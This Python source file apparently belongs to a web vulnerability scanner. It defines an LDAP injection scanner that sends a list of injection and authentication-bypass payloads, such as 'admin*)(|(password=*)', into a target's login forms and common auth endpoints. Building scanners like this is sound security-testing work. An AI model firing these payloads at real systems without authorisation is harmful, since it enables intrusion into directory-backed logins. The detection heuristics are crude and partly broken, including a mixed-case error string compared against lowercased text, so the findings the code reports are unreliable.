from core.scanner_imports import *

class LDAPInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        self.payloads = [
            "*",
            "*)(&",
            "*))%00",
            "*()|(&",
            "*)(uid=*))(|(uid=*",
            "admin*",
            "admin*)(|(password=*)",
            ")(cn=*)",
            "*)(uid=*))(|(uid=*",
            "*)(|(|(mail=*))",
        ]

    def scan(self) -> Dict:
        try:
            tasks = []
            response = self.make_request(self.target_url)
            
            if not response:
                return {'ldap_injection': []}

            # Scan login forms
            forms = self.extract_forms(response.text)
            for form in forms:
                for input_field in form.get('inputs', []):
                    if input_field.get('type') in ['text', 'password']:
                        tasks.append({
                            'url': form.get('action', self.target_url),
                            'method': form.get('method', 'POST'),
                            'parameter': input_field.get('name', ''),
                            'type': 'form'
                        })

            # Test common LDAP endpoints
            endpoints = ['/login', '/auth', '/ldap', '/search']
            for endpoint in endpoints:
                url = f"{self.target_url.rstrip('/')}{endpoint}"
                tasks.append({
                    'url': url,
                    'method': 'GET',
                    'parameter': 'username',
                    'type': 'endpoint'
                })

            results = self.run_concurrent_tasks(tasks)
            return {'ldap_injection': [r for r in results if r]}

        except Exception as e:
            logging.error(f"LDAP Injection scanner error: {e}")
            return {'ldap_injection': [], 'error': str(e)}

    def execute_task(self, task: Dict) -> Optional[Dict]:
        try:
            for payload in self.payloads:
                # Make baseline request
                normal_response = self.make_request(
                    task['url'],
                    method=task['method'],
                    data={task['parameter']: 'normal_user'} if task['method'] == 'POST' else None,
                    params={task['parameter']: 'normal_user'} if task['method'] == 'GET' else None,
                    timeout=5  # Add timeout
                )

                # Test payload
                response = self.make_request(
                    task['url'],
                    method=task['method'],
                    data={task['parameter']: payload} if task['method'] == 'POST' else None,
                    params={task['parameter']: payload} if task['method'] == 'GET' else None,
                    timeout=5  # Add timeout
                )

                if not response or not normal_response:
                    continue

                # Check for LDAP injection indicators
                if self.detect_ldap_injection(normal_response, response):
                    return {
                        'url': task['url'],
                        'parameter': task['parameter'],
                        'type': 'LDAP Injection',
                        'payload': payload,
                        'severity': 'High',
                        'evidence': 'LDAP injection pattern detected in response'
                    }

            return None

        except Exception as e:
            logging.error(f"Error in LDAP injection task: {e}")
            return None

    def detect_ldap_injection(self, normal_response, payload_response) -> bool:
        # Different response length
        if abs(len(normal_response.text) - len(payload_response.text)) > 50:
            return True

        # Different status code
        if normal_response.status_code != payload_response.status_code:
            return True

        # Check for LDAP-specific errors
        ldap_errors = [
            'ldap_',
            'invalid filter',
            'search filter',
            'invalid DN syntax',
            'directory service error'
        ]

        return any(error in payload_response.text.lower() 
                  and error not in normal_response.text.lower() 
                  for error in ldap_errors)

    def extract_forms(self, html: str) -> List[Dict]:
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                inputs = []
                for input_field in form.find_all(['input', 'textarea']):
                    inputs.append({
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text')
                    })
                
                forms.append({
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').upper(),
                    'inputs': inputs
                })
            
            return forms
        except Exception as e:
            logging.error(f"Error extracting forms: {e}")
            return []
